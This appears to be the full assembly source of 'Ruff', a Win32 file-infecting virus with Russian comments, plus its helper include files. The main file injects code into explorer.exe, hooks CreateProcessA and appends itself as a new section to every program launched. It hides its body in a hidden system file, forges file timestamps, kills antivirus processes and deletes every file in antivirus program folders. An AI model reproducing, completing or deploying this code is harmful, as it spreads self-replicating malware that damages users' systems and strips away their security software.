────────────────────────────────────────────────────────────────[FINAL.ASM]───
swap_file equ 'c:\swap',0
;DEBUG equ YES
include win32api.inc
include rulez.inc
include process.inc
include pe.inc
.586
locals __
model flat
.data
extrn      ExitProcess:Proc
extrn      GetLastError:Proc
mess db   'Ruff',0
.code
start:
IFDEF DEBUG
int   3
ELSE
ENDIF
call get_offset
get_offset:
pop   ebp                       ;ebp=offset
sub   ebp,offset get_offset
mov   [counter+ebp],0           ;обнулим переменные
mov   [process_to_open+ebp],0
mov   eax,[new_rva+ebp]
mov   [old_rva+ebp],eax
pop   eax                       ;eax=address of entry of exit function
push  eax
and   eax,0ffff0000h             ;округляем до кратного 65536
add   eax,65536
__not_found:
sub  eax,65536
cmp  word ptr [eax],'ZM'
jne  __not_found                 ;eax - загрузочный адрес kernel32
mov   [kernel_base+ebp],eax
mov   ebx,eax                    ;ebx - загрузочный адрес kernel32
push  ebx
add   ebx,[ebx.exe_neptr]        ;eax - начало PE-header'a
cmp   word ptr  [ebx],'EP'
je    kernel_found
pop   ebx
jmp   goto_host
kernel_found:
add    eax,[ebx+78h]              ;eax= rva of export table
pop    ebx

push   eax eax
push   ebx ebx
add    ebx,[eax.ED_AddressOfNames] ;ebx = array of RVA to names
pop    eax ecx
__0:
push   eax
add    eax,[ebx]                  ;eax=Rva of first exported function
add    ebx,4
inc    [counter+ebp]
lea    esi,[sGetProcAddress+ebp+4]
mov    edi,eax
call   StrCompare
pop    eax
je     GetProcFound
jmp    __0
GetProcFound:
pop    ebx
push   eax
add    eax,[ebx.ED_AddressOfOrdinals] ;ebx = array of ordinals to names
movzx   ecx,[counter+ebp]
shl    ecx,1
add    eax,ecx                         ;eax=address ordinal of getprocaddress
mov    cx,word ptr [eax]
pop    eax
pop    ebx                              ;ebx= adrress of export table
sub    ecx,[ebx.ED_BaseOrdinal]
mov    [getpraddrord+ebp],cx
add    eax,[ebx.ED_AddressOfFunctions]  ;eax=rva of functions
movzx  ecx,[getpraddrord+ebp]
shl    ecx,2
mov    ebx,eax
add    ebx,ecx
mov    ebx,[ebx]
add    ebx,[kernel_base+ebp]
mov    [sGetProcAddress+ebp],ebx
;получить адреса функций
lea    edi,[sBeep+ebp+4]     ;ebx = offset of array of function names
__2:
push   edi
push   edi
push   dword ptr [kernel_base+ebp]
mov    eax,[sGetProcAddress+ebp]
call   eax
pop    edi
mov    [edi-4],eax
mov    ecx,0ffh
xor    al,al
repnz  scasb
add    edi,4
cmp    byte ptr [edi],0
je     all_funct_found
jmp    __2
all_funct_found:
;найти explorer и инсталлироваться в память
push   0
push   TH32CS_SNAPPROCESS
mov    eax,[sCreateToolhelp32Snapshot+ebp]
call   eax
mov    [hSnapshot+ebp],eax             ;eax = HSnapShot
mov    [prentry+ebp].dwSize,pr_size

lea    ebx,[prentry+ebp]
push   ebx
push   eax
mov    eax,[sProcess32First+ebp]
call   eax
ll:
lea    ebx,[prentry+ebp]
push   ebx
push   [hSnapshot+ebp]
mov    eax,[sProcess32Next+ebp]
call   eax
or     eax,eax
jz     end_of_list
xor    ax,ax
lea    edi,[prentry+ebp].szExeFile
mov    ecx,0ffffh
cld
repnz  scasb
mov    al,'\'
std
mov    cx,0ffffh
repnz  scasb
add    edi,2
call   is_bad_prog
or     eax,eax
jz     not_bad_prog
call   TerminateBadProg
not_bad_prog:
cmp    [edi],'LPXE'
je     expl_found
jmp    ll
expl_found:
mov    eax,[prentry+ebp.th32ProcessID]
mov    [process_to_open+ebp],eax
jmp    ll
end_of_list:
cmp    [process_to_open+ebp],0
je     goto_host
;найдём модуль SHELL32
cld
push   [hSnapshot+ebp]
mov    eax,[sCloseHandle+ebp]
call   eax
push   [process_to_open+ebp]
push   TH32CS_SNAPMODULE
mov    eax,[sCreateToolhelp32Snapshot+ebp]
call   eax
mov    [hSnapshot+ebp],eax
mov    [modentry+ebp.dwSize],mod_size
push   eax                      ;eax = HSnapShot
lea    ebx,[modentry+ebp]
push   ebx
push   eax
mov    eax,[sModule32First+ebp]
call   eax
pop    eax
lea    ebx, modentry+ebp.szModule
lea    ecx, modentry+ebp.szExePath
qq:
push   eax                      ;eax = HSnapShot
mov    [modentry+ebp.dwSize],mod_size
cld
lea    ebx,[modentry+ebp]
push   ebx
push   eax
mov    eax,[sModule32Next+ebp]
call   eax
or     eax,eax
jz     shell32_not_found
pop    eax
cmp    dword ptr [modentry+ebp.szModule],'LEHS'
je     shell32_found
jmp    qq
shell32_not_found:
jmp    goto_host
shell32_found:

push   [hSnapshot+ebp]
mov    eax,[sCloseHandle+ebp]
call   eax

push   [process_to_open+ebp]
push   1
;Open process with all access rights
push   PROCESS_ALL_ACCESS
mov    eax,[sOpenProcess+ebp]
call   eax
mov    [open_handle+ebp],eax
IFDEF DEBUG
int   3
ELSE
ENDIF
;выделяем память (GlobalAlloc И VirtualAlloc для буфера под hintnames
;из хоста, начинаем поиск необходимых ф-ий, счётчик ф-ий = index
;в Address table
push   2*4096
push   0
mov    eax,[sGlobalAlloc+ebp]
call   eax
mov    [buffer+ebp],eax
;проверить, не записаны лии мы уже туда
push    eax
lea    ebx,nmbofread+ebp
push   ebx
push   20
push   eax
push   400000h
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
pop    eax
cmp    [eax],'RUFF'
je     goto_host
mov    eax,[modentry.modBaseAddr+ebp]
mov    [base_addr+ebp],eax
;read process header
lea    ebx,nmbofread+ebp
push   ebx
push   40h
push   [buffer+ebp]
push   [base_addr+ebp]
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    eax,[buffer+ebp]
mov    eax,[eax+3ch]
add    eax,[base_addr+ebp]       ;указатель на PE header
IFDEF DEBUG
int   3
ELSE
ENDIF
lea    ebx,nmbofread+ebp         ;читаем PE-header
push   ebx
push   100h
push  [buffer+ebp]
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
call   fcheckerror
jc     goto_host
mov    eax,[buffer+ebp]
mov    eax,[eax+80h]
add    eax,[base_addr+ebp]       ;we got Import table directory address
IFDEF DEBUG
int   3
ELSE
ENDIF
__3:
push   eax
lea    ebx,nmbofread+ebp
push   ebx                       ;читаем каталог импорта
push   14h
push   [buffer+ebp]
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    eax,[buffer+ebp]
mov    eax,[eax+0ch]
add    eax,[base_addr+ebp]              ;eax - import library RVA
lea    ebx,nmbofread+ebp         ;читаем имя библиотечки
push   ebx
push   8
mov    ebx,[buffer+ebp]
add    ebx,20h
push   ebx
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    eax,[buffer+ebp]
add    eax,20h
mov    edi,eax
mov   byte ptr  [edi+8],0
lea    esi,[n_kernel+ebp]
call   StrCompare
pop   eax
je    __2                              ;следующая директория
add   eax,14h
jmp    __3                       ;следующая директория
__2:                             ;каталог импорта для KERNEL32 найден
;в EAX - каталог импорта для KERNEL32
mov    eax,[buffer+ebp]
mov    eax,[eax]                 ;в EAX - Table of Hint Names RVA's
add    eax,[base_addr+ebp]
lea    ebx,nmbofread+ebp         ;читаем 4096 байт RVA HINTNAMES
push   ebx
push   4096
mov    ebx,[buffer+ebp]          ;читаем в buffer +4096
add    ebx,4096
push   ebx
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    eax,[buffer+ebp]          ;в eax - buffer+4096
add    eax,4096
cld
mov     [counter+ebp],0
IFDEF DEBUG
int   3
ELSE
ENDIF
go:
inc    [counter+ebp]
push   eax
mov    eax,[eax]
add    eax,2
add    eax,[base_addr+ebp]
lea    ebx,nmbofread+ebp         ;читаем имя функции
push   ebx
push   15
push   [buffer+ebp]                 ;читаем в buffer
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
mov    edi,[buffer+ebp]
find_cp:
lea    esi,sCreateProcess+ebp+4
call   StrCompare
pop    eax                       ;сравниваем имена функций
je     cp_found
again:
add    eax,4
jmp    go
cp_found:
mov       eax,[sCloseHandle+ebp]
mov       [ch_addr+ebp],eax
mov       eax,[sDeleteFile+ebp]
mov       [df_addr+ebp],eax
mov       eax,[sCreateFileA+ebp]
mov       [cf_addr+ebp],eax
mov       eax,[sReadFile+ebp]
mov       [rf_addr+ebp],eax
mov       eax,[sGlobalAlloc+ebp]
mov       [ga_addr+ebp],eax
mov      eax,[buffer+ebp]
mov      eax,[eax+10h]                ;eax=RVA of ADdress table
movzx    ebx,[counter+ebp]
imul     ebx,4                      ;eax=entry for CreateProcess  !!
add      eax,ebx
add      eax,[base_addr+ebp]
sub      eax,4
push     eax
mov     [cp_addr+ebp],eax
lea    ebx,nmbofread+ebp     ;записать старый адрес ф-ии
push   ebx
push   4
lea    ebx, old_addr+ebp
push   ebx
push   eax
push   [open_handle+ebp]
mov    eax,[sReadProcessMemory+ebp]
call   eax
;mov    eax,[sMessageBox+ebp]
;mov    [mb_addr+ebp],eax
lea    ebx,nmbofwrt+ebp           ;записать наш код на адрес 400000h
push   ebx
push   module_size
lea    ebx, module+ebp
push   ebx
push   400000h
push   [open_handle+ebp]
mov    eax,[sWriteProcessMemory+ebp]
call   eax
pop    eax
mov    ebx,[buffer+ebp]
mov    [ebx],400000h
lea    ebx,nmbofwrt+ebp          ;заменить адрес ф-ии
push   ebx
push   4
push   [buffer+ebp]
push   eax
push   [open_handle+ebp]
mov    eax,[sWriteProcessMemory+ebp]
call   eax
call   fcheckerror
jc     goto_host
;открыть файл 'c:\swap'
push     0
push     FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
push     CREATE_ALWAYS
push     0
push     0                      ;SHARED MODE
push     GENERIC_WRITE          ;access
lea      ebx,filename+ebp
push     ebx
mov      eax,[sCreateFileA+ebp]
call     eax
;записать основное тело вируса туда
push     eax
push     0         ;overlapped stucture = 0
lea      ebx,nobw+ebp
push     ebx        ;number of bytes written
push     vir_size
lea      ebx,start+ebp
push     ebx
push     eax
mov      eax,[sWriteFile+ebp]
call     eax
mov      eax,[sCloseHandle+ebp]
call     eax
;вернуть управление
;push   0
;call   ExitProcess
goto_host:
push     [open_handle+ebp]
mov      eax,[sCloseHandle+ebp]
call     eax
goto_host_1:
db   0b8h
old_rva                 dd        offset host
jmp                     eax
new_rva                 dd        offset host
main_body_jmp=$-start
main_body:
pushf
;pusha
push   ebx ecx edx esi edi ebp
call  __1
__1:
pop   ebp
sub   ebp,offset __1
mov   edx,[esp+0ch+24]               ;eax=file to infect
mov   al,' '
cmp   byte ptr [edx],'"'
jne   __2
mov   al,'"'
add   edx,1
__2:
mov   edi,edx
mov   ecx,0ffh
repnz   scasb
mov   byte ptr [edi-1],0
mov   bl,al
push  edi
mov   edi,edx
call  is_bad_prog
pop   edi
or    eax,eax
jz    __good_prog
;edi=end of program name
;edx=beginning of the path
call   DeleteBadProg
mov    byte ptr  [edi-1],bl
pop    ebp edi esi edx ecx ebx
popf
stc
db   0c2h
dw   10*4
__good_prog:
push  edi ebx
call  fopenEx
pop   edx  edi
mov   byte ptr  [edi-1],dl
jc    not_opened

                        mov     [maphandle+ebp], eax
                        mov     [filehandle+ebp], ebx
                        mov     [filesize+ebp], ecx
                        push    eax
;узнать время файла
lea      ebx,[faccess_time+ebp]
push     ebx
lea      ebx,[fwrite_time+ebp]
push     ebx
lea      ebx,[fcreate_time+ebp]
push     ebx
push     [filehandle+ebp]
mov      eax,[sGetFileTime+ebp]
call     eax
xor   ecx,ecx
call    is_infected
or    eax,eax
pop   eax
jz    dont_infect

                        mov     ebx,[eax+3ch]           ;ebx=PE header
                        add     ebx,eax
                        cmp     word ptr [ebx],'EP'
                        jne     dont_infect

                        mov     [pe_head+ebp],ebx
                        mov     eax,[ebx+38h]
                        mov     [obj_align+ebp],eax
                        mov     eax,[ebx+3ch]
                        mov     [file_align+ebp],eax
                        movzx   ecx,word ptr [ebx+6h]    ;num of objects
                        inc     word ptr [ebx+6]
                        dec     ecx                      ;last object in table
                        imul    cx,28h
                        add     bx, word ptr [ebx+14h]  ;NT header size
                        add     ebx,18h                 ;ebx= object table
                        add     ebx,ecx             ;ebx=last object in table
                        push    ebx
                        xor     edx,edx
                        lea     ecx,new_sec_head+ebp
;almost random name

;сосчитаем RVA
                        mov     eax,[ebx.RVA]
                        add     eax,[ebx.VirtualSize]
                        div     [obj_align+ebp]
                        add     eax,1
                        imul    eax,[obj_align+ebp]
                        mov     [ecx.RVA],eax
;сосчитаем Virtual Size
                        xor     edx,edx
                        mov     eax,vir_size
                        div     [obj_align+ebp]
                        add     eax,1
                        imul    eax,[obj_align+ebp]
                        mov     [ecx.VirtualSize],eax
;сосчитаем Physical Size
                        xor     edx,edx
                        mov     eax,vir_size
                        div     [file_align+ebp]
                        add     eax,1
                        imul    eax,[file_align+ebp]
                        mov     [ecx.PhysSize],eax
;сосчитаем Physical Offset
                        xor     edx,edx
                        mov     eax,[ebx.PhysOffset]
                        add     eax,[ebx.PhysSize]
                        mov     [ecx.PhysOffset],eax
                        pop     ebx
                        lea     esi,new_sec_head+ebp
                        mov     edi,ebx
                        add     edi,28h
                        push    ecx
                        mov     ecx,28h
                        rep     movsb
                        pop     ecx
                        mov     ebx,[pe_head+ebp]
                        mov     eax,[ecx.VirtualSize]
                        add     [ebx+50h],eax           ;Image Size
                        mov     eax,[ebx+28h]           ;Entry point RVA
                        add     eax,[ebx+34h]           ;add image base
                        mov     [new_rva+ebp],eax

                        mov     eax,[ecx.RVA]           ;Entry point RVA
                        mov     [ebx+28h],eax


                        lea     esi,start+ebp
                        mov     edi,[ecx.PhysOffset]
                        add     edi,[maphandle+ebp]
                        mov     ecx,vir_size
;                       mov     ecx,[ecx.PhysSize]
                        rep     movsb

;exit:
                        call    mark_infection

;установить время файла
lea      ebx,[faccess_time+ebp]
push     ebx
lea      ebx,[fwrite_time+ebp]
push     ebx

lea        ebx,[fcreate_time+ebp]
push      ebx

push      [filehandle+ebp]
mov       eax,[sSetFileTime+ebp]
call     eax
                        lea     ecx,new_sec_head+ebp
                        mov     ecx, [ecx.PhysSize]
dont_infect:
                        add     ecx, [filesize+ebp]
                        mov     eax, [maphandle+ebp]  ; unmap, trunc. & close file
                        mov     ebx, [filehandle+ebp]
                        call    fcloseEx
;popa
not_opened:
mov    eax,[old_addr+ebp]
pop    ebp edi esi edx ecx ebx
popf
jmp   eax
mark_infection:
lea      ebx,[fcreate_time+ebp]
mov   word ptr  [ebx.FT_dwLowDateTime+3],11001011110b
ret
is_infected:
lea      ebx,[fcreate_time+ebp]
mov      eax,0                       ;infected
cmp   word ptr  [ebx.FT_dwLowDateTime+3],11001011110b
je       __1
mov      eax,1                       ;not infected
__1:
ret
TerminateBadProg:
push   [prentry.th32ProcessID+ebp]
push   1
;Open process with all access rights
push   PROCESS_ALL_ACCESS
mov    eax,[sOpenProcess+ebp]
call   eax
push   2
push   eax
mov    eax,[sTerminateProcess]
call   eax
ret
is_bad_prog:
;edi = our prog
push      edi esi ecx edx
cld
lea       esi,term1+ebp
__1:
call      StrPos
jz        __bad_prog_found
mov       ecx,0ffh
push      edi
mov       edi,esi
xor       al,al
repnz     scasb
mov       esi,edi
pop       edi
xor       eax,eax
cmp       byte ptr  [esi],0
je        __exit
jmp       __1
__bad_prog_found:
mov       eax,1
__exit:
pop       edx ecx esi edi
ret
DeleteBadProg:
push   eax edi ecx edx
std
mov     al,'\'
mov     ecx,0ffh
repnz   scasb
add     edi,2   ;edi= end of directory
push     edx
mov      byte ptr [edi],0
lea      ebx,curr_directory+ebp
push     ebx
push     MAX_PATH
mov      eax,[sGetCurrentDirectory+ebp]
call     eax
mov      eax,[sSetCurrentDirectory+ebp]
call     eax
or       eax,eax
jz       __exit
lea      ebx,wfd+ebp
push     ebx
lea      ebx,mask+ebp
push     ebx
mov      eax,[sFindFirstFileA+ebp]
call     eax
push     eax            ;eax=handle
__delete_it:
lea      ebx,wfd.WFD_szFileName+ebp
push     ebx
mov      eax,[sDeleteFile+ebp]
call     eax
pop      eax
push     eax            ;;
lea      ebx,wfd+ebp
push     ebx
push     eax
mov      eax,[sFindNextFileA+ebp]
call     eax
or       eax,eax
jnz      __delete_it
pop      eax
lea      ebx,[curr_directory+ebp]
push     ebx
mov      eax,[sSetCurrentDirectory+ebp]
call     eax
__exit:
pop      edx ecx edi eax
ret
old_addr  dd 0
;mb_addr   dd 0
include _fio.inc
include _fioEx.inc
include  strings.asm
fcreate_time       FILETIME ?
fwrite_time       FILETIME ?
faccess_time       FILETIME ?
filemaphandle           dd      ?
filehandle              dd      ?
maphandle               dd      ?
filesize                dd      ?
obj_align               dd      ?
file_align              dd      ?
new_sec_head            section_header <'Ruff',,,vir_size>
pe_head                 dd      ?
sBeep        dd 0
db 'Beep',0
sCreateProcess        dd 0
db 'CreateProcessA',0
sGetLastError dd 0
db 'GetLastError',0
sTerminateProcess dd 0
db 'TerminateProcess',0
sCreateFileA dd 0
db 'CreateFileA',0
sCloseHandle dd 0
db 'CloseHandle',0
sSetFilePointer dd 0
db 'SetFilePointer',0
sReadFile dd 0
db 'ReadFile',0
sWriteFile dd 0
db 'WriteFile',0
sCreateFileMappingA dd 0
db 'CreateFileMappingA',0
sMapViewOfFile dd 0
db 'MapViewOfFile',0
sUnmapViewOfFile dd 0
db 'UnmapViewOfFile',0
sGetFileSize dd 0
db 'GetFileSize',0
sSetEndOfFile dd 0
db 'SetEndOfFile',0
sDeleteFile dd 0
db 'DeleteFileA',0
sGetProcAddress dd 0
db 'GetProcAddress',0
sGetModuleHandle dd 0
db 'GetModuleHandleA',0
sGetFileTime dd 0
db 'GetFileTime',0
sSetFileTime dd 0
db 'SetFileTime',0
sFindFirstFileA dd 0
db 'FindFirstFileA',0
sFindNextFileA dd 0
db 'FindNextFileA',0
sGetWindowsDirectory dd 0
db 'GetWindowsDirectoryA',0
sCreateToolhelp32Snapshot dd 0
db 'CreateToolhelp32Snapshot',0
sGetCurrentDirectory dd 0
db 'GetCurrentDirectoryA',0
sSetCurrentDirectory dd 0
db 'SetCurrentDirectoryA',0
sProcess32First dd 0
db 'Process32First',0
sProcess32Next dd 0
db 'Process32Next',0
sModule32First dd 0
db 'Module32First',0
sModule32Next dd 0
db 'Module32Next',0
sWriteProcessMemory dd 0
db 'WriteProcessMemory',0
sReadProcessMemory dd 0
db 'ReadProcessMemory',0
sOpenProcess dd 0
db 'OpenProcess',0
sGlobalAlloc dd 0
db 'GlobalAlloc',0,0,0,0,0,0
;                          ^end signature
;exe_mask db '*.exe',0
module:
pushf
push   eax ebx ecx edx esi edi ebp
;выделить память
push    vir_size+100
push    0
mov     eax,_ga_addr
call    [eax]
push    eax
push    0
push     FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
push     OPEN_EXISTING
push     0
push     0                     ;SHARED MODE
push     GENERIC_READ          ;access
push     _filename
mov      eax,_cf_addr
call     [eax]
mov      ebx,400000h
mov      [ebx],'RUFF'
;записать основное тело вируса туда
pop      ebx                  ;ebx=allocated memory
push     ebx
push     eax
push     0                    ;overlapped stucture = 0
push     _nobr                ;number of bytes readen
push     vir_size
push     ebx                  ;ebx=allocated memory
push     eax
mov      eax,_rf_addr
call     [eax]
mov      eax,_ch_addr
call     [eax]
push     _filename
mov      eax,_df_addr
call     [eax]
pop      ebx
mov      eax,_cp_addr
mov      eax,[eax]
add      ebx,main_body_jmp
mov      [eax],ebx
mov       eax,ebx
pop     ebp edi esi edx ecx ebx ebx
popf
jmp      eax                  ;ebx=allocated memory
_cp_addr=$-module+400000h
cp_addr  dd    0
_nobr=$-module+400000h
nobr     dd              0
_filename=$-module+400000h
filename db swap_file
_cf_addr=$-module+400000h
cf_addr dd 0                    ;Createfilea
_ch_addr=$-module+400000h
ch_addr dd 0                    ;CloseHandle
_rf_addr=$-module+400000h
rf_addr dd 0                    ;readfile
_ga_addr=$-module+400000h
ga_addr dd 0                    ;globalalloc
_df_addr=$-module+400000h
df_addr dd 0
module_size=$-module
coolmessage db 'We are the Ruffest !',0
db '(c) Charly',0
;sMessageBox dd 0
;db 'MessageBoxA',0
open_handle dd 0
hSnapshot dd    0
nmbofread dd 0
nmbofwrt  dd 0
base_addr dd 0               ;базовый адрес модуля с которым мы работаем
buffer dd 0                  ;содержит адрес выделенной нам памяти
prentry PROCESSENTRY32 <>
pr_size=$-prentry
modentry MODULEENTRY32 <>
mod_size=$-modentry
term1     db 'AVP',0
          db 'avp',0
          db 'Avp',0
          db 'Web',0
          db 'web',0
          db 'Drw',0
          db 'DRW',0
          db 'drw',0,0
n_kernel db 'KERNEL32',0
;n_user db   'USER32',0
process_to_open dd 0
nobw   dd 0
kernel_base dd 0
curr_directory  db MAX_PATH dup(0)
get_proc_addr dd 0
;get_wnd_dir db MAX_PATH dup(0)
getpraddrord dw 0
counter dw   0
mask    db '*.*',0
wfd WIN32_FIND_DATA <>
vir_size=$-start
host:
push             0
call             ExitProcess
end  start







────────────────────────────────────────────────────────────────[FINAL.ASM]───
────────────────────────────────────────────────────────────────[RULEZ.INC]───
section_header            STRUC
    Name                   DB    8  DUP (0)
    VirtualSize            DD    0
    RVA                    DD    0
    PhysSize               DD    0
    PhysOffset             DD    0
    db 0ch  dup(0)
    Flags                 db 40h,0,0,0c0h
    Characteristics        DD    ?
section_header             ENDS

ERROR_NO_MORE_FILES      equ        18
b0              equ     (byte ptr 0)
b1              equ     (byte ptr 1)
b2              equ     (byte ptr 2)
b3              equ     (byte ptr 3)

w0              equ     (word ptr 0)
w1              equ     (word ptr 1)
w2              equ     (word ptr 2)
w3              equ     (word ptr 3)

d0              equ     (dword ptr 0)
d1              equ     (dword ptr 1)
d2              equ     (dword ptr 2)
d3              equ     (dword ptr 3)

l               equ     w0
h               equ     w2

o               equ     w0
s               equ     w2

offs            equ     w0
segm            equ     w2

                ; flags

_CF             equ     0001h
_PF             equ     0004h
_AF             equ     0010h
_ZF             equ     0040h
_SF             equ     0080h
_TF             equ     0100h
_IF             equ     0200h
_OF             equ     0800h

                ; dos file attributes

_Readonly       equ     01h
_Hidden         equ     02h
_System         equ     04h
_VolumeID       equ     08h
_Directory      equ     10h
_Archive        equ     20h

mve             macro   x, y
                push    y
                pop     x
                endm

outb            macro   _dx, _al
                mov     dx, _dx
                mov     al, _al
                out     dx, al
                endm

outw            macro   _dx, _ax
                mov     dx, _dx
                mov     ax, _ax
                out     dx, ax
                endm

outd            macro   _dx, _eax
                mov     dx, _dx
                mov     eax, _eax
                out     dx, eax
                endm

setalc          macro
                db      0D6h
                endm


lastword        macro   name
name            equ     word ptr $-2
                endm

lastbyte        macro   name
name            equ     byte ptr $-1
                endm





getint          macro   xx
                mov     ax, 35&xx&h
                int     21h
                mov     old&xx&.o, bx
                mov     old&xx&.s, es
                endm

setint          macro   xx
                mov     ax, 25&xx&h
                mve     ds, cs
                lea     dx, int&xx
                int     21h
                endm

replaceint      macro   xx
                getint  xx
                setint  xx
                endm

tsr             macro   lastlabel
                mov     ah, 49h
                mov     es, cs:[002Ch]
                int     21h
                mov     ax, 3100h
                mov     dx, (lastlabel - start + 256 + 15) / 16
                int     21h
                endm


                ; dta

dta_struc       struc
dta_drive       db      ?               ; 0=a,1=b,2=c
dta_name8       db      8 dup (?)
dta_ext3        db      3 dup (?)
dta_searchattr  db      ?
dta_num         dw      ?               ; 0=. 1=..
dta_dircluster  dw      ?
                dd      ?               ; unused
dta_attr        db      ?               ; 1=r 32=a 16=d 2=h 4=s 8=v
dta_time        dw      ?               ; чччччммм мммссссс
dta_date        dw      ?               ; гггггггм мммддддд
dta_size        dd      ?
dta_name        db      13 dup (?)
                ends

                ; exe header

exe_struc       struc
exe_mz          dw      ?
exe_last512     dw      ?
exe_num512      dw      ?
exe_relnum      dw      ?
exe_headersize  dw      ?
exe_minmem      dw      ?
exe_maxmem      dw      ?
exe_ss          dw      ?
exe_sp          dw      ?
exe_checksum    dw      ?
exe_ip          dw      ?
exe_cs          dw      ?
exe_relofs      dw      ?
exe_ovrnum      dw      ?
                db      32 dup (?)
exe_neptr       dd      ?
                ends

                ; sys header

sys_header      struc
sys_nextdriver  dd      ?               ; last driver: offset = FFFF
sys_attr        dw      ?
sys_strategy    dw      ?
sys_interrupt   dw      ?
sys_name        db      8 dup (?)
                ends

                ; sft

sft_struc       struc
sft_handles     dw      ?               ; сколько у файла дескрипторов
sft_openmode    dw      ?
sft_attr        db      ?               ; атрибуты файла
sft_flags       dw      ?               ; бит 14 - сохранять дату/время при закрытии
sft_deviceptr   dd      ?               ; если символьное устр-во - header драйвера
sft_filecluster dw      ?               ; начальный кластер файла
sft_date        dw      ?
sft_time        dw      ?
sft_size        dd      ?
sft_pos         dd      ?
sft_lastFclustr dw      ?               ; относительный номер кластера в файле
                                        ; к кототорму было последнее обращение
sft_dirsect     dd      ?               ; сектор содержащий элемент каталога
sft_dirpos      db      ?               ; номер элемента каталога в секторе
sft_name        db      11 dup (?)
sft_chain       dd      ?               ; share.exe
sft_uid         dw      ?               ; share.exe
sft_psp         dw      ?
sft_mft         dw      ?               ; share.exe
sft_lastclust   dw      ?               ; номер кластера к которому было посл. обращ.
sft_ptr         dd      ?               ; указатель на драйвер ifs файла/0 если лок.
                ends





────────────────────────────────────────────────────────────────[RULEZ.INC]───
──────────────────────────────────────────────────────────────[PROCESS.INC]───
TH32CS_SNAPHEAPLIST  EQU   00000001h
TH32CS_SNAPPROCESS  equ 00000002h
TH32CS_SNAPTHREAD   equ 00000004h
TH32CS_INHERIT      equ 80000000h
TH32CS_SNAPMODULE       equ     00000008h
TH32CS_SNAPALL     equ TH32CS_SNAPHEAPLIST or TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD or TH32CS_SNAPMODULE
MAX_MODULE_NAME32        equ    255
THREAD_PRIORITY_HIGHEST  EQU    2
CREATE_SUSPENDED         EQU    00000004h

DETACHED_PROCESS         EQU    00000008h

NORMAL_PRIORITY_CLASS    EQU    00000020h
IDLE_PRIORITY_CLASS      EQU    00000040h
HIGH_PRIORITY_CLASS      EQU    00000080h
REALTIME_PRIORITY_CLASS  EQU    00000100h



SYNCHRONIZE        EQU              00100000h
STANDARD_RIGHTS_REQUIRED  EQU        000F0000h
CREATE_NEW_PROCESS_GROUP EQU   00000200h
CREATE_UNICODE_ENVIRONMENT EQU  00000400h

PROCESS_CREATE_THREAD    EQU   0002h
CREATE_SEPARATE_WOW_VDM  EQU   00000800h
CREATE_SHARED_WOW_VDM    EQU   00001000h
CREATE_FORCEDOS          EQU   00002000h

CREATE_DEFAULT_ERROR_MODE EQU  04000000h
CREATE_NO_WINDOW          EQU  08000000h
PROCESS_VM_READ  EQU       0010h
PROCESS_VM_WRITE  EQU      0020h
TH32CS_SNAPPROCESS EQU  00000002h
PROCESSENTRY32 struct
dwSize               DD    0;
cntUsage             DD    0
th32ProcessID        DD    0 ;          // this process
th32DefaultHeapID    DD    0 ;
th32ModuleID         DD    0;           // associated exe
cntThreads           DD    0;
th32ParentProcessID  DD    0;    // this process's parent process
pcPriClassBase       DD    0;         // Base priority of process's threads
dwFlags              DD    0;
szExeFile                  DB  MAX_PATH DUP(0)   ;    // Path
PROCESSENTRY32 ends

MODULEENTRY32  struct
dwSize               DD    0   ;
th32ModModuleID      DD    0   ;This module
th32ProcessID        DD    0   ;owning process
GlblcntUsage         DD    0   ;Global usage count on the module
ProccntUsage         DD    0   ;Module usage count in th32ProcessID's context
modBaseAddr          DD    0   ;Base address of module in th32ProcessID's context
modBaseSize          DD    0   ;Size in bytes of module starting at modBaseAddr
hModule              DD    0   ;The hModule of this module in th32ProcessID's context
szModule             DB MAX_MODULE_NAME32+1 DUP(0)
szExePath            DB MAX_PATH DUP(0)
MODULEENTRY32 ends
PROCESS_ALL_ACCESS EQU STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or 0FFFh

FLOATING_SAVE_AREA struct
ControlWord        dd ?
StatusWord         dd ?
TagWordd           dd ?
ErrorOffset        dd ?
ErrorSelector      dd ?
DataOffset         dd ?
DataSelector       dd ?
RegisterArea db SIZE_OF_80387_REGISTERS dup(?)
Cr0NpxState        dd ?
FLOATING_SAVE_AREA ends

CONTEXT struct
ContextFlags    dd    ?
Dr0              dd    ?
Dr1              dd    ?
Dr2              dd    ?
Dr3              dd    ?
Dr6              dd    ?
Dr7              dd    ?

FloatSave FLOATING_SAVE_AREA  ?
SegGs   dd    ?
SegFs   dd    ?
SegEs   dd    ?
SegDs   dd    ?

Edi     dd    ?
Esi     dd    ?
Ebx     dd    ?
Edx     dd    ?
Ecx     dd    ?
Eax     dd    ?
Ebp     dd    ?
Eip     dd    ?
SegCs   dd    ?
EFlags  dd    ?
Esp     dd    ?
SegSs   dd    ?

CONTEXT ends
──────────────────────────────────────────────────────────────[PROCESS.INC]───
─────────────────────────────────────────────────────────────────[_FIO.INC]───
;ALL_FIO                equ     TRUE

; fopen  (EDX=fname)  : CF=1  EAX=errorcode   CF=0 EAX=handle
; fclose (EBX=handle) : CF=1  EAX=errorcode   CF=0
; IFDEF ALL_FIO
; fcreate(EDX=fname)  : CF=1  EAX=errorcode   CF=0 EAX=handle
; fread  (EBX=handle,
;         EDX=buffer,
;         ECX=size)   : CF=1  EAX=errorcode   CF=0 EAX=bytesread
; fwrite(EBX,EDX,ECX) : CF=1  EAX=errorcode   CF=0 EAX=bytesread
; ENDIF

OPEN_EXISTING           equ             3
CREATE_ALWAYS           equ             2
;GENERIC_READ            equ             080000000h
;GENERIC_WRITE           equ             040000000h
FILE_SHARE_READ         equ             000000001h
FILE_SHARE_WRITE        equ             000000002h
FILE_ATTRIBUTE_NORMAL   equ             000000080h

access_ebx              equ     (dword ptr 16)
